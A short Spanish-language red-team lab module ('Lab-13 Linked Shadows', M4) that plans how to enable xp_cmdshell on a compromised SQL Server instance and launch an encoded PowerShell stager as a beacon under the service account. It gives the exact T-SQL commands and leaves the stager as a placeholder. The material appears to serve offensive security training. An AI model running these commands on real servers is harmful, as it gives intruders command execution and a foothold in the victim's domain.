# Módulo M4 · xp_cmdshell — ejecución de OS y beacon — Lab-13 LINKED SHADOWS

> **Módulo M4 · Ruta: `[crítica]`**
>
> **Objetivo único:** Habilitar xp_cmdshell (si no está) y ejecutar un beacon bajo la cuenta de servicio SQL.
>
> **Prerequisito real:** M3 (sysadmin en la instancia).
>
> **Habilita:** baliza activa en el servidor SQL bajo la cuenta de servicio (a menudo privilegiada en el dominio).
>
> **TTP:** T1059

## Plan de ejecución

Verificar si ya habilitado: `SELECT value FROM sys.configurations WHERE name='xp_cmdshell'`. Si no: `EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE`. Luego: `EXEC xp_cmdshell 'powershell -enc <stager>'`.

## Operativa real (completar al ejecutar)

> ⚠ Arquetipo operación: este módulo es el PLAN. Captura aquí la ejecución real — comandos, salidas, capturas, la cuenta de servicio SQL obtenida.

---

*Módulo M4 · Lab-13 Linked Shadows · Cloud Hopper SQL (anatomía v3.1, arquetipo operación)*
